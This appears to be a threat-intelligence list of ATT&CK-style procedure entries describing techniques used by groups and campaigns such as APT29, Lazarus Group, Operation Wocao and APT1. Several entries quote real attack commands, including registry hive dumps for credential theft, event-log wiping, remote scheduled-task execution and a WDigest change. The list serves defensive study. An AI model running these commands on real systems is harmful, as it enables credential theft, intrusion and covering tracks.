During Operation CuckooBees, the threat actors used the `net user` command to gather account information.
During Operation CuckooBees, the threat actors used the `net group` command as part of their advanced reconnaissance.
During Operation CuckooBees, the threat actors renamed a malicious executable to `rundll32.exe` to allow it to blend in with other Windows system files.
During Operation CuckooBees, the threat actors used the `net share` command as part of their advanced reconnaissance.
During Operation CuckooBees, the threat actors used the `net accounts` command as part of their advanced reconnaissance.
During Operation CuckooBees, the threat actors used the `fsutil fsinfo drives` command as part of their advanced reconnaissance.
During Operation CuckooBees, the threat actors used the `tasklist` command as part of their advanced reconnaissance.
During Operation CuckooBees, the threat actors used the `net view` and `ping` commands as part of their advanced reconnaissance.
During Operation CuckooBees, the threat actors used scheduled tasks to execute batch scripts for lateral movement with the following command: `SCHTASKS /Create /S &lt;IP Address&gt; /U &lt;Username&gt; /p &lt;Password&gt; /SC ONCE /TN test /TR &lt;Path to a Batch File&gt; /ST &lt;Time&gt; /RU SYSTEM.`
During Operation CuckooBees, the threat actors leveraged a custom tool to dump OS credentials and used following commands: `reg save HKLM\\SYSTEM system.hiv`, `reg save HKLM\\SAM sam.hiv`, and `reg save HKLM\\SECURITY security.hiv`, to dump SAM, SYSTEM and SECURITY hives.
During Operation CuckooBees, the threat actors used the `systeminfo` command to gather details about a compromised system.
During Operation CuckooBees, the threat actors used `ipconfig`, `nbtstat`, `tracert`, `route print`, and `cat /etc/hosts` commands.
During Operation CuckooBees, the threat actors used the `net session`, `net use`, and `netstat` commands as part of their advanced reconnaissance.
During Operation CuckooBees, the threat actors used the `query user` and `whoami` commands as part of their advanced reconnaissance.
During Operation CuckooBees, the threat actors used the `net start` command as part of their initial reconnaissance.
During Operation CuckooBees, the threat actors used the `net time` command as part of their advanced reconnaissance.
For Operation CuckooBees, the threat actors obtained publicly-available JSP code that was used to deploy a webshell onto a compromised server.
During Operation CuckooBees, the threat actors executed an encoded VBScript file using `wscript` and wrote the decoded output to a text file.
During Operation CuckooBees, the threat actors enabled HTTP and HTTPS listeners.
During Operation CuckooBees, the threat actors generated a web shell within a vulnerable Enterprise Resource Planning Web Application Server as a persistence mechanism.
During Operation CuckooBees, the threat actors used batch scripts to perform reconnaissance.
During Operation CuckooBees, the threat actors modified the `IKEEXT` and `PrintNotify` Windows services for persistence.
During Operation Dream Job, Lazarus Group archived victim's data into a RAR file.
During Operation Dream Job, Lazarus Group performed brute force attacks against administrator accounts.
During Operation Dream Job, Lazarus Group digitally signed their own malware to evade detection.
During Operation Dream Job, Lazarus Group digitally signed their malware and the dbxcli utility.
During Operation Dream Job, Lazarus Group used code signing certificates issued by Sectigo RSA for some of its malware and tools.
During Operation Dream Job, Lazarus Group used malicious Trojans and DLL files to exfiltrate data from an infected host.
During Operation Dream Job, Lazarus Group used tools that used the `IsDebuggerPresent` call to detect debuggers.
During Operation Dream Job, Lazarus Group queried compromised victim's active directory servers to obtain the list of employees including administrator accounts.
During Operation Dream Job, Lazarus Group registered a domain name identical to that of a compromised company as part of their BEC effort.
For Operation Dream Job, Lazarus Group compromised domains in Italy and other countries for their C2 infrastructure.
During Operation Dream Job, Lazarus Group created fake email accounts to correspond with fake LinkedIn personas; Lazarus Group also established email accounts to match those of the victim as part of their BEC attempt.
During Operation Dream Job, Lazarus Group encrypted malware such as  DRATzarus with XOR and DLL files with base64.
During Operation Dream Job, Lazarus Group exfiltrated data from a compromised host to actor-controlled C2 servers.
During Operation Dream Job, Lazarus Group used a custom build of open-source command-line dbxcli to exfiltrate stolen data to Dropbox.
During Operation Dream Job, Lazarus Group removed all previously delivered files from a compromised computer.
During Operation Dream Job, Lazarus Group conducted word searches within documents on a compromised host in search of security and financial matters.
For Operation Dream Job, Lazarus Group conducted extensive reconnaissance research on potential targets.
For Operation Dream Job, Lazarus Group gathered victim organization information to identify specific targets.
During Operation Dream Job, Lazarus Group targeted Windows servers running Internet Information Systems (IIS) to install C2 components.
During Operation Dream Job, Lazarus Group targeted specific individuals within an organization with tailored job vacancy announcements.
During Operation Dream Job, Lazarus Group impersonated HR hiring personnel through LinkedIn messages and conducted interviews with victims in order to deceive them into downloading malware.
During Operation Dream Job, Lazarus Group downloaded multistage malware and tools onto a compromised host.
During Operation Dream Job, Lazarus Group conducted internal spearphishing from within a compromised organization.
During Operation Dream Job, Lazarus Group lured victims into executing malicious documents that contained "dream job" descriptions from defense, aerospace, and other sectors.
During Operation Dream Job, Lazarus Group lured users into executing a malicious link to disclose private account information or provide initial access.
For Operation Dream Job, Lazarus Group developed custom tools such as Sumarta, DBLL Dropper, Torisma, and DRATzarus for their operations.
During Operation Dream Job, Lazarus Group disguised malicious template files as JPEG files to avoid detection.
During Operation Dream Job, Lazarus Group used Windows API `ObtainUserAgentString` to obtain the victim's User-Agent and used the value to connect to their C2 server.
During Operation Dream Job, Lazarus Group used PowerShell commands to explore the environment of compromised victims.
During Operation Dream Job, Lazarus Group placed LNK files into the victims' startup folder for persistence.
During Operation Dream Job, Lazarus Group used `regsvr32` to execute malware.
During Operation Dream Job, Lazarus Group executed malware with `C:\\windows\system32\rundll32.exe "C:\ProgramData\ThumbNail\thumbnail.db"`, `CtrlPanel S-6-81-3811-75432205-060098-6872 0 0 905`.
During Operation Dream Job, Lazarus Group created scheduled tasks to set a periodic execution of a remote XSL script.
During Operation Dream Job, Lazarus Group acquired servers to host their malicious tools.
For Operation Dream Job, Lazarus Group compromised servers to host their malicious tools.
For Operation Dream Job, Lazarus Group used LinkedIn to identify and target employees within a chosen organization.
For Operation Dream Job, Lazarus Group created fake LinkedIn accounts for their targeting efforts.
During Operation Dream Job, Lazarus Group packed malicious .db files with Themida to evade detection.
During Operation Dream Job, Lazarus Group sent emails with malicious attachments to gain unauthorized access to targets' computers.
During Operation Dream Job, Lazarus Group sent malicious OneDrive links with fictitious job offer advertisements via email.
During Operation Dream Job, Lazarus Group sent victims spearphishing messages via LinkedIn concerning fictitious jobs.
During Operation Dream Job, Lazarus Group used an AES key to communicate with their C2 server.
During Operation Dream Job, Lazarus Group used tools that conducted a variety of system checks to detect sandboxes or VMware services.
During Operation Dream Job, Lazarus Group deployed malware designed not to run on computers set to Korean, Japanese, or Chinese in Windows language preferences.
During Operation Dream Job, Lazarus Group used DOCX files to retrieve a malicious document template/DOTM file.
During Operation Dream Job, Lazarus Group used tools that collected `GetTickCount` and `GetSystemTimeAsFileTime` data to detect sandbox or VMware services.
For Operation Dream Job, Lazarus Group obtained tools such as Wake-On-Lan, Responder, ChromePass, and dbxcli.
For Operation Dream Job, Lazarus Group used compromised servers to host malware.
For Operation Dream Job, Lazarus Group used multiple servers to host malicious tools.
During Operation Dream Job, Lazarus Group executed a VBA written malicious macro after victims download malicious DOTM files; Lazarus Group also used Visual Basic macro code to extract a double Base64 encoded DLL implant.
During Operation Dream Job, Lazarus Group uses HTTP and HTTPS to contact actor-controlled C2 servers.
During Operation Dream Job, Lazarus Group used file hosting services like DropBox and OneDrive.
During Operation Dream Job, Lazarus Group launched malicious DLL files, created new folders, and renamed folders with the use of the Windows command shell.
During Operation Dream Job, Lazarus Group used WMIC to executed a remote XSL script.
During Operation Dream Job, Lazarus Group used a remote XSL script to download a Base64-encoded DLL custom downloader.
During Operation Dust Storm, attackers used VBS code to decode payloads.
For Operation Dust Storm, the threat actors established domains as part of their operational infrastructure.
During Operation Dust Storm, the threat actors used a watering hole attack on a popular software reseller to exploit the then-zero-day Internet Explorer vulnerability CVE-2014-0322.
For Operation Dust Storm, the threat actors used dynamic DNS domains from a variety of free providers, including No-IP, Oray, and 3322.
For Operation Dust Storm, the threat actors established email addresses to register domains for their operations.
During Operation Dust Storm, the threat actors encoded some payloads with a single-byte XOR, both skipping the key itself and zeroing in an attempt to avoid exposing the key; other payloads were Base64-encoded.
During Operation Dust Storm, the threat actors exploited Adobe Flash vulnerability CVE-2011-0611, Microsoft Windows Help vulnerability CVE-2010-1885, and several Internet Explorer vulnerabilities, including CVE-2011-1255, CVE-2012-1889, and CVE-2014-0322.
During Operation Dust Storm, the threat actors used JavaScript code.
During Operation Dust Storm, the threat actors relied on potential victims to open a malicious Microsoft Word document sent via email.
During Operation Dust Storm, the threat actors relied on a victim clicking on a malicious link sent via email.
For Operation Dust Storm, the threat actors disguised some executables as JPG files.
During Operation Dust Storm, the threat actors executed JavaScript code via `mshta.exe`.
During Operation Dust Storm, the threat actors deployed a file called `DeployJava.js` to fingerprint installed software on a victim system prior to exploit delivery.
For Operation Dust Storm, the threat actors used UPX to pack some payloads.
During Operation Dust Storm, the threat actors sent spearphishing emails that contained a malicious Microsoft Word document.
During Operation Dust Storm, the threat actors sent spearphishing emails containing a malicious link.
During Operation Dust Storm, the threat actors used Visual Basic scripts.
For Operation Ghost, APT29 used social media platforms to hide communications to C2 servers.
For Operation Ghost, APT29 used stolen administrator credentials for lateral movement on compromised networks.
For Operation Ghost, APT29 registered domains for use in C2 including some crafted to appear as existing legitimate domains.
For Operation Ghost, APT29 used new strains of malware including FatDuke, MiniDuke, RegDuke, and PolyglotDuke.
For Operation Ghost, APT29 registered Twitter accounts to host C2 nodes.
During Operation Ghost, APT29 used steganography to hide payloads inside valid images.
During Operation Ghost, APT29 used steganography to hide the communications between the implants and their C&amp;C servers.
During Operation Ghost, APT29 used WMI event subscriptions to establish persistence for malware.
During Operation Honeybee, the threat actors uses zip to pack collected files before exfiltration.
During Operation Honeybee, the threat actors used the malicious NTWDBLIB.DLL and `cliconfig.exe` to bypass UAC protections.
During Operation Honeybee, the threat actors deployed the MaoCheng dropper with a stolen Adobe Systems digital signature.
During Operation Honeybee, the threat actors collected data from compromised hosts.
During Operation Honeybee, malicious files were decoded prior to execution.
For Operation Honeybee, the threat actors stole a digital signature from Adobe Systems to use with their MaoCheng dropper.
During Operation Honeybee, threat actors registered domains for C2.
During Operation Honeybee, attackers created email addresses to register for a free account for a control server used for the implants.
During Operation Honeybee, the threat actors used Base64 to encode files with a custom key.
During Operation Honeybee, the threat actors uploaded stolen files to their C2 servers.
During Operation Honeybee, the threat actors used batch files that reduced their fingerprint on a compromised system by deleting malware-related files.
During Operation Honeybee, the threat actors had the ability to use FTP for C2.
During Operation Honeybee, the threat actors used a malicious DLL to search for files with specific keywords.
During Operation Honeybee, the threat actors downloaded additional malware and malicious scripts onto a compromised host.
During Operation Honeybee, stolen data was copied into a text file using the format `From &lt;COMPUTER-NAME&gt; (&lt;Month&gt;-&lt;Day&gt; &lt;Hour&gt;-&lt;Minute&gt;-&lt;Second&gt;).txt` prior to compression, encoding, and exfiltration.
During Operation Honeybee, threat actors relied on a victim to enable macros within a malicious Word document.
During Operation Honeybee, the threat actors modified the MaoCheng dropper so its icon appeared as a Word document.
During Operation Honeybee, the threat actors used a legitimate Windows executable and secure directory for their payloads to bypass UAC.
During Operation Honeybee, the threat actors used batch files that modified registry keys.
During Operation Honeybee, the threat actors deployed malware that used API calls, including `CreateProcessAsUser`.
During Operation Honeybee, the threat actors obtained a list of running processes on a victim machine using `cmd /c tasklist &gt; %temp%\temp.ini`.
For Operation Honeybee, at least one identified persona was used to register for a free account for a control server.
During Operation Honeybee, threat actors ran &lt;code&gt;sc start&lt;/code&gt; to start the COMSysApp as part of the service hijacking and &lt;code&gt;sc stop&lt;/code&gt; to stop and reconfigure the COMSysApp.
During Operation Honeybee, the threat actors used a batch file that modified the COMSysApp service to load a malicious ipnet.dll payload and to load a DLL into the `svchost.exe` process.
During Operation Honeybee, the threat actors collected the computer name, OS, and other system information using `cmd /c systeminfo &gt; %temp%\ temp.ini`.
For Operation Honeybee, the threat actors used a Visual Basic script embedded within a Word document to download an implant.
During Operation Honeybee, various implants used batch scripting and `cmd.exe` for execution.
During Operation Honeybee, threat actors installed DLLs and backdoors as Windows services.
During Operation Sharpshooter, threat actors sent malicious Word OLE documents to victims.
During Operation Sharpshooter, additional payloads were downloaded after a target was infected with a first-stage downloader.
During Operation Sharpshooter, the threat actors relied on victims executing malicious Microsoft Word or PDF files.
For Operation Sharpshooter, the threat actors used the Rising Sun modular backdoor.
During Operation Sharpshooter, threat actors installed Rising Sun in the Startup folder and disguised it as `mssync.exe`.
During Operation Sharpshooter, the first stage downloader resolved various Windows libraries and APIs, including `LoadLibraryA()`, `GetProcAddress()`, and `CreateProcessA()`.
During Operation Sharpshooter, threat actors leveraged embedded shellcode to inject a downloader into the memory of Word.
For Operation Sharpshooter, the threat actors used the ExpressVPN service to hide their location.
During Operation Sharpshooter, a first-stage downloader installed Rising Sun to `%Startup%\mssync.exe` on a compromised host.
For Operation Sharpshooter, the threat actors compromised a server they used as part of the campaign's infrastructure.
For Operation Sharpshooter, the threat actors staged malicious files on Dropbox and other websites.
During Operation Sharpshooter, the threat actors used a VBA macro to execute a simple downloader that installed Rising Sun.
For Operation Sharpshooter, the threat actors used Dropbox to host lure documents and their first-stage downloader.
For Operation Spalax, the threat actors used Nullsoft Scriptable Install System (NSIS) scripts to install malware.
For Operation Spalax, the threat actors used a variety of packers and droppers to decrypt malicious payloads.
For Operation Spalax, the threat actors registered hundreds of domains using Duck DNS and DNS Exit.
For Operation Spalax, the threat actors used dynamic DNS services, including Duck DNS and DNS Exit, as part of their C2 infrastructure.
For Operation Spalax, the threat actors used XOR-encrypted payloads.
During Operation Spalax, the threat actors relied on a victim to open a PDF document and click on an embedded malicious link to download malware.
During Operation Spalax, the threat actors relied on a victim to click on a malicious link distributed via phishing emails.
For Operation Spalax, the threat actors obtained malware, including Remcos, njRAT, and AsyncRAT.
During Operation Spalax, the threat actors used `rundll32.exe` to execute malicious installers.
For Operation Spalax, the threat actors used a variety of packers, including CyaX, to obfuscate malicious executables.
During Operation Spalax, the threat actors sent phishing emails that included a PDF document that in some cases led to the download and execution of malware.
During Operation Spalax, the threat actors sent phishing emails to victims that contained a malicious link.
For Operation Spalax, the threat actors used packers that read pixel data from images contained in PE files' resource sections and build the next layer of execution from the data.
For Operation Spalax, the threat actors obtained packers such as CyaX.
For Operation Spalax, the threat actors staged malware and malicious files in legitimate hosting services such as OneDrive or MediaFire.
During Operation Spalax, the threat actors used droppers that would run anti-analysis checks before executing malware on a compromised host.
During Operation Spalax, the threat actors used OneDrive and MediaFire to host payloads.
During Operation Wocao, threat actors archived collected files with WinRAR, prior to exfiltration.
During Operation Wocao, threat actors' proxy implementation "Agent" upgraded the socket in use to a TLS socket.
During Operation Wocao, threat actors used a script to collect information about the infected system.
During Operation Wocao, the threat actors deleted all Windows system and security event logs using `/Q /c wevtutil cl system` and `/Q /c wevtutil cl security`.
During Operation Wocao, threat actors collected clipboard data in plaintext.
During Operation Wocao, threat actors executed PowerShell commands which were encoded or compressed using Base64, zlib, and XOR.
During Operation Wocao, threat actors used Mimikatz's DCSync to dump credentials from the memory of the targeted system.
During Operation Wocao, threat actors encrypted IP addresses used for "Agent" proxy hops with RC4.
During Operation Wocao, threat actors exfiltrated files and directories of interest from the targeted system.
During Operation Wocao, threat actors used PowerShell to add and delete rules in the Windows firewall.
During Operation Wocao, threat actors used the `net` command to retrieve information about domain accounts.
During Operation Wocao, threat actors used domain credentials, including domain admin, for lateral movement and privilege escalation.
For Operation Wocao, the threat actors registered email accounts to use during the campaign.
During Operation Wocao, threat actors used the XServer backdoor to exfiltrate data.
During Operation Wocao, threat actors gained initial access by exploiting vulnerabilities in JBoss webservers.
During Operation Wocao, threat actors used stolen credentials to connect to the victim's network via VPN.
During Operation Wocao, the threat actors consistently removed traces of their activity by first overwriting a file using `/c cd /d c:\windows\temp\ &amp; copy \\&lt;IP ADDRESS&gt;\c$\windows\system32\devmgr.dll \\&lt;IP ADDRESS&gt;\c$\windows\temp\LMAKSW.ps1 /y` and then deleting the overwritten file using `/c cd /d c:\windows\temp\ &amp; del \\&lt;IP ADDRESS&gt;\c$\windows\temp\LMAKSW.ps1`.
During Operation Wocao, threat actors gathered a recursive directory listing to find files and directories of interest.
During Operation Wocao, threat actors targeted people based on their organizational roles and privileges.
During Operation Wocao, threat actors edited variable names within the Impacket suite to avoid automated detection.
During Operation Wocao, threat actors downloaded additional files to the infected system.
During Operation Wocao, threat actors proxied traffic through multiple infected systems.
During Operation Wocao, threat actors used a Visual Basic script that checked for internet connectivity.
During Operation Wocao, threat actors used PowerSploit's `Invoke-Kerberoast` module to request encrypted service tickets and bruteforce the passwords of Windows service accounts offline.
During Operation Wocao, threat actors obtained the password for the victim's password manager via a custom keylogger.
During Operation Wocao, threat actors used ProcDump to dump credentials from memory.
During Operation Wocao, threat actors used SMB to copy files to and from target systems.
During Operation Wocao, threat actors used local account credentials found during the intrusion for lateral movement and privilege escalation.
During Operation Wocao, threat actors staged archived files in a temporary directory prior to exfiltration.
During Operation Wocao, threat actors used the command `net localgroup administrators` to list all administrators part of a local group.
During Operation Wocao, threat actors developed their own custom webshells to upload to compromised servers.
During Operation Wocao, the threat actors renamed some tools and executables to appear as legitimate programs.
During Operation Wocao, the threat actors enabled Wdigest by changing the `HKLM\SYSTEM\\ControlSet001\\Control\\SecurityProviders\\WDigest` registry value from 0 (disabled) to 1 (enabled).
During Operation Wocao, threat actors used a custom collection method to intercept two-factor authentication soft tokens.
During Operation Wocao, threat actors executed commands through the installed web shell via Tor exit nodes.
During Operation Wocao, threat actors used the `CreateProcessA` and `ShellExecute` API functions to launch commands after being injected into a selected process.
During Operation Wocao, threat actors scanned for open ports and used nbtscan to find NETBIOS nameservers.
During Operation Wocao, threat actors discovered network disks mounted to the system using netstat.
During Operation Wocao, threat actors used a custom protocol for command and control.
During Operation Wocao, the threat actors used uncommon high ports for its backdoor C2, including ports 25667 and 47000.
During Operation Wocao, threat actors accessed and collected credentials from password managers.
During Operation Wocao, threat actors discovered removable disks attached to a system.
During Operation Wocao, threat actors used PowerShell on compromised systems.
During Operation Wocao, threat actors used Mimikatz to dump certificates and private keys from the Windows certificate store.
During Operation Wocao, the threat actors used `tasklist` to collect a list of running processes on an infected system.
During Operation Wocao, threat actors injected code into a selected process, which in turn launches a command as a child process of the original.
During Operation Wocao, threat actors used a custom proxy tool called "Agent" which has support for multiple hops.
During Operation Wocao, threat actors' backdoors were written in Python and compiled with py2exe.
During Operation Wocao, the threat actors executed `/c cd /d c:\windows\temp\ &amp; reg query HKEY_CURRENT_USER\Software\&lt;username&gt;\PuTTY\Sessions\` to detect recent PuTTY sessions, likely to further lateral movement.
During Operation Wocao, threat actors used `nbtscan` and `ping` to discover remote systems, as well as `dsquery subnet` on a domain controller to retrieve all subnets in the Active Directory.
During Operation Wocao, threat actors used Impacket's smbexec.py as well as accessing the C$ and IPC$ shares to move laterally.
During Operation Wocao, threat actors used scheduled tasks to execute malicious PowerShell code on remote systems.
During Operation Wocao, threat actors used scripts to detect security software.
For Operation Wocao, the threat actors purchased servers with Bitcoin to use during the operation.
During Operation Wocao, threat actors created services on remote systems for execution purposes.
During Operation Wocao, threat actors collected a list of installed software on the infected system.
During Operation Wocao, threat actors discovered the local disks attached to the system and their hardware information including manufacturer and model, as well as the OS versions of systems connected to a targeted network.
During Operation Wocao, threat actors discovered the local network configuration with `ipconfig`.
During Operation Wocao, threat actors collected a list of open connections on the infected system using `netstat` and checks whether it has an internet connection.
During Operation Wocao, threat actors enumerated sessions and users on a remote host, and identified privileged users logged into a targeted system.
During Operation Wocao, threat actors used the `tasklist` command to search for one of its backdoors.
During Operation Wocao, threat actors used the `time` command to retrieve the current time of a compromised system.
For Operation Wocao, the threat actors obtained a variety of open source tools, including JexBoss, KeeThief, and BloodHound.
During Operation Wocao, threat actors used valid VPN credentials to gain initial access.
During Operation Wocao, threat actors used VBScript to conduct reconnaissance on targeted systems.
During Operation Wocao, threat actors’ XServer tool communicated using HTTP and HTTPS.
During Operation Wocao, threat actors used their own web shells, as well as those previously placed on target systems by other threat actors, for reconnaissance and lateral movement.
During Operation Wocao, threat actors spawned a new `cmd.exe` process to execute commands.
During Operation Wocao, threat actors has used WMI to execute commands.
During the SolarWinds Compromise, APT29 obtained a list of users and their roles from an Exchange server using `Get-ManagementRoleAssignment`.
During the SolarWinds Compromise, APT29 added credentials to OAuth Applications and Service Principals.
During the SolarWinds Compromise, APT29 granted `company administrator` privileges to a newly created service principle.
During the SolarWinds Compromise, APT29 added their own devices as allowed IDs for active sync using `Set-CASMailbox`, allowing it to obtain copies of victim mailboxes. It also added additional permissions (such as Mail.Read and Mail.ReadWrite) to compromised Application or Service Principals.
During the SolarWinds Compromise, APT29 used compromised service principals to make changes to the Office 365 environment.
During the SolarWinds Compromise, APT29 used 7-Zip to compress stolen emails into password-protected archives prior to exfltration; APT29 also compressed text files into zipped archives.
During the SolarWinds Compromise, APT29 removed evidence of email export requests using `Remove-MailboxExportRequest`.
During the SolarWinds Compromise, APT29 used a compromised O365 administrator account to create a new Service Principal.
During the SolarWinds Compromise, APT29 downloaded source code from code repositories.
During the SolarWinds Compromise, APT29 was able to get SUNBURST signed by SolarWinds code signing certificates by injecting the malware into the SolarWinds Orion software lifecycle.
During the SolarWinds Compromise, APT29 gained initial network access to some victims via a trojanized update of SolarWinds Orion software.
For the SolarWinds Compromise, APT29 conducted credential theft operations to obtain credentials to be used for access to victim environments.
During the SolarWinds Compromise, APT29 used account credentials they obtained to attempt access to Group Managed Service Account (gMSA) passwords.
During the SolarWinds Compromise, APT29 stole users' saved passwords from Chrome.
During the SolarWinds Compromise, APT29 used privileged accounts to replicate directory service data with domain controllers.
During the SolarWinds Compromise, APT29 accessed victims' internal knowledge repositories (wikis) to view sensitive corporate information on products, services, and internal business operations.
During the SolarWinds Compromise, APT29 extracted files from compromised networks.
During the SolarWinds Compromise, APT29 used 7-Zip to decode their Raindrop malware.
During the SolarWinds Compromise, APT29 registered devices in order to enable mailbox syncing via the `Set-CASMailbox` command.
During the SolarWinds Compromise, APT29, used `AUDITPOL` to prevent the collection of audit logs.
During the SolarWinds Compromise, APT29 used `netsh` to configure firewall rules that limited certain UDP outbound packets.
During the SolarWinds Compromise, APT29 used the service control manager on a remote system to disable services associated with security monitoring products.
During the SolarWinds Compromise, APT29 used PowerShell to discover domain accounts by exectuing `Get-ADUser` and `Get-ADGroupMember`.
During the SolarWinds Compromise, APT29 used domain administrators' accounts to help facilitate lateral movement on compromised networks.
During the SolarWinds Compromise, APT29 used AdFind to enumerate domain groups.
During the SolarWinds Compromise, APT29 used the `Get-AcceptedDomain` PowerShell cmdlet to enumerate accepted domains through an Exchange Management Shell. They also used AdFind to enumerate domains and to discover trust between federated domains.
For the SolarWinds Compromise, APT29 acquired C2 domains, sometimes through resellers.
For the SolarWinds Compromise, APT29 compromised domains to use for C2.
During the SolarWinds Compromise, APT29 used dynamic DNS resolution to construct and resolve to randomly-generated subdomains for C2.
During the SolarWinds Compromise, APT29 exfiltrated collected data over a simple HTTPS request to a password-protected archive staged on a victim's OWA servers.
During the SolarWinds Compromise, APT29 exploited CVE-2020-0688 against the Microsoft Exchange Control Panel to regain access to a network.
For the SolarWinds Compromise, APT29 used compromised identities to access networks via SSH, VPNs, and other remote access tools.
During the SolarWinds Compromise, APT29 routinely removed their tools, including custom backdoors, once remote access was achieved.
During the SolarWinds Compromise, APT29 obtained information about the configured Exchange virtual directory using `Get-WebServicesVirtualDirectory`.
During the SolarWinds Compromise, APT29 set the hostnames of their C2 infrastructure to match legitimate hostnames in the victim environment. They also used IP addresses originating from the same country as the victim for their VPN infrastructure.
During the SolarWinds Compromise, APT29 temporarily replaced legitimate utilities with their own, executed their payload, and then restored the original file.
During the SolarWinds Compromise, APT29 downloaded additional malware, such as TEARDROP and Cobalt Strike, onto a compromised host following initial access.
During the SolarWinds Compromise, APT29 used SSH port forwarding capabilities on public-facing systems, and configured at least one instance of Cobalt Strike to use a network pipe over SMB.
During the SolarWinds Compromise, APT29 used GoldFinder to perform HTTP GET requests to check internet connectivity and identify HTTP proxy servers and other redirectors that an HTTP request travels through.
During the SolarWinds Compromise, APT29 obtained Ticket Granting Service (TGS) tickets for Active Directory Service Principle Names to crack offline.
During the SolarWinds Compromise, APT29 used compromised local accounts to access victims' networks.
For the SolarWinds Compromise, APT29 used numerous pieces of malware that were likely developed for or by the group, including SUNBURST, SUNSPOT, Raindrop, and TEARDROP.
During the SolarWinds Compromise, APT29 named tasks `\Microsoft\Windows\SoftwareProtectionPlatform\EventCacheManager` in order to appear legitimate.
During the SolarWinds Compromise, APT29 renamed software and DLLs with legitimate names to appear benign.
During the SolarWinds Compromise, APT29 used the `Get-ManagementRoleAssignment` PowerShell cmdlet to enumerate Exchange management role assignments through an Exchange Management Shell.
During the SolarWinds Compromise, APT29 used PowerShell to create new tasks on remote machines, identify configuration settings, exfiltrate data, and execute other commands.
During the SolarWinds Compromise, APT29 obtained PKI keys, certificate files, and the private encryption key from an Active Directory Federation Services (AD FS) container to decrypt corresponding SAML signing certificates.
During the SolarWinds Compromise, APT29 used multiple command-line utilities to enumerate running processes.
During the SolarWinds Compromise, APT29 staged data and files in password-protected archives on a victim's OWA server.
During the SolarWinds Compromise, APT29 used RDP sessions from public-facing systems to internal servers.
During the SolarWinds Compromise, APT29 collected emails from specific individuals, such as executives and IT staff, using `New-MailboxExportRequest` followed by `Get-MailboxExportRequest`.
During the SolarWinds Compromise, APT29 used AdFind to enumerate remote systems.
During the SolarWinds Compromise, APT29 used `Rundll32.exe` to execute payloads.
During the SolarWinds Compromise, APT29 created tokens using compromised SAML signing certificates.
During the SolarWinds Compromise, APT29 used administrative accounts to connect over SMB to targeted users.
During the SolarWinds Compromise, APT29 used `scheduler` and `schtasks` to create new tasks on remote host as part of their lateral movement. They manipulated scheduled tasks by updating an existing legitimate task to execute their tools and then returned the scheduled task to its original configuration. APT29 also created a scheduled task to maintain SUNSPOT persistence when the host booted.
During the SolarWinds Compromise, APT29 stole Chrome browser cookies by copying the Chrome profile directories of targeted users.
During the SolarWinds Compromise, APT29 used `fsutil` to check available free space before executing actions that might create large files on disk.
During the SolarWinds Compromise, APT29 modified timestamps of backdoors to match legitimate Windows files.
During the SolarWinds Compromise, APT29 changed domain federation trust settings using Azure AD administrative permissions to configure the domain to accept authorization tokens signed by their own SAML signing certificate.
During the SolarWinds Compromise, APT29 gained access through compromised accounts at cloud solution partners, and used compromised certificates issued by Mimecast to authenticate to Mimecast customer systems.
During the SolarWinds Compromise, APT29 used forged SAML tokens that allowed the actors to impersonate users and bypass MFA, enabling APT29 to access enterprise cloud applications and services.
During the SolarWinds Compromise, APT29 used different compromised credentials for remote access and to move laterally.
For the SolarWinds Compromise, APT29 wrote malware such as Sibot in Visual Basic.
During the SolarWinds Compromise, APT29 bypassed MFA set on OWA accounts by generating a cookie value from a previously stolen secret key.
During the SolarWinds Compromise, APT29 used HTTP for C2 and data exfiltration.
During the SolarWinds Compromise, APT29 used stolen cookies to access cloud resources and a forged `duo-sid` cookie to bypass MFA set on an email account.
During the SolarWinds Compromise, APT29 used `cmd.exe` to execute commands on remote machines.
During the SolarWinds Compromise, APT29 used WMI for the remote execution of files for lateral movement.
During the SolarWinds Compromise, APT29 used a WMI event filter to invoke a command-line event consumer at system boot time to launch a backdoor with `rundll32.exe`.
During the SolarWinds Compromise, APT29 used WinRM via PowerShell to execute commands and payloads on remote hosts.
In the Triton Safety Instrumented System Attack, TEMP.Veles engaged in network reconnaissance against targets of interest.
In the Triton Safety Instrumented System Attack, TEMP.Veles used cryptcat binaries to encrypt their traffic.
In the Triton Safety Instrumented System Attack, TEMP.Veles modified files based on the open-source project cryptcat in an apparent attempt to decrease anti-virus detection rates.
In the Triton Safety Instrumented System Attack, TEMP.Veles used Mimikatz.
In the Triton Safety Instrumented System Attack, TEMP.Veles developed, prior to the attack, malware capabilities that would require access to specific and specialized hardware and software.
In the Triton Safety Instrumented System Attack, TEMP.Veles renamed files to look like legitimate files, such as Windows update files or Schneider Electric application files.
In the Triton Safety Instrumented System Attack, TEMP.Veles used a publicly available PowerShell-based tool, WMImplant.
In the Triton Safety Instrumented System Attack, TEMP.Veles installed scheduled tasks defined in XML files.
In the Triton Safety Instrumented System Attack, TEMP.Veles used tools such as Mimikatz and other open-source software.
In the Triton Safety Instrumented System Attack, TEMP.Veles captured credentials as they were being changed by redirecting text-based login codes to websites they controlled.
APT-C-36 has downloaded binary data from a specified domain after the malicious document is opened.
APT-C-36 has prompted victims to accept macros in order to execute the subsequent payload.
APT-C-36 has disguised its scheduled tasks as those used by Google.
APT-C-36 has used port 4050 for C2 communications.
APT-C-36 has used ConfuserEx to obfuscate its variant of Imminent Monitor, compressed payload and RAT packages, and password protected encrypted email attachments to avoid detection.
APT-C-36 has used a macro function to set scheduled tasks, disguised as those used by Google.
APT-C-36 has used spearphishing emails with password protected RAR attachment to avoid being detected by the email gateway.
APT-C-36 obtained and used a modified variant of Imminent Monitor.
APT-C-36 has embedded a VBScript within a malicious Word document which is executed upon the document opening.
APT1 has used RAR to compress files before moving them outside of the victim network.
APT1 used a batch script to perform a series of discovery techniques and saves it to a text file.
APT1 has collected files from a local victim.
APT1 has registered hundreds of domains for use in operations.
APT1 hijacked FQDNs associated with legitimate websites hosted by hop points.
APT1 has created email accounts for later use in social engineering, phishing, and when registering domains.
APT1 has been known to use credential dumping using Mimikatz.
APT1 used the commands &lt;code&gt;net localgroup&lt;/code&gt;,&lt;code&gt;net user&lt;/code&gt;, and &lt;code&gt;net group&lt;/code&gt; to find accounts on the system.
APT1 uses two utilities, GETMAIL and MAPIGET, to steal email. GETMAIL extracts emails from archived Outlook .pst files.
APT1 used publicly available malware for privilege escalation.
The file name AcroRD32.exe, a legitimate process name for Adobe's Acrobat Reader, was used by APT1 as a name for malware.
APT1 listed connected network shares.
The APT1 group is known to have used pass the hash.
APT1 gathered a list of running processes on the system using &lt;code&gt;tasklist /v&lt;/code&gt;.
The APT1 group is known to have used RDP during operations.
APT1 uses two utilities, GETMAIL and MAPIGET, to steal email. MAPIGET steals email still on Exchange servers that has not yet been archived.
